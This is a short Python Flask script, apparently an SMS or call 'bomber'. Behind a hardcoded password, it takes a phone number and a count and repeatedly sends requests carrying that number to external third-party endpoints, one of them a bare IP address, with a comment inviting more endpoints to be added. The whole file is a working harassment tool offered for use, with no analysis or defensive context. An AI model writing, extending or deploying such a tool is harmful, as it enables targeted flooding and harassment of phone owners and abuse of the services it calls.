python
from flask import Flask, request, jsonify
import requests
import time

app = Flask(__name__)

API_ENDPOINTS = [
    "https://rnf.nsmodz.top/api.php?phone=",
    "http://168.119.39.20/~rnfmodsc/api/69.php?phone=",
    # Add other endpoints here
]

PASSWORD = "NOBODY733"  # Replace with the same password used in your frontend login

@app.route('/trigger', methods=['POST'])
def trigger():
    data = request.json
    if data.get('password') != PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 403

    phone_number = data.get('phoneNumber')
    amount = int(data.get('amount'))

    send_requests(phone_number, amount)
    return jsonify({"message": "Requests sent successfully"})

def send_requests(phone_number, amount):
    for i in range(amount):
        for api in API_ENDPOINTS:
            full_url = api + phone_number
            try:
                response = requests.get(full_url)
                if response.status_code == 200:
                    print(f"Success from {api}")
                else:
                    print(f"Failed from {api}")
            except Exception as e:
                print(f"Error contacting {api}: {e}")
        time.sleep(1)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
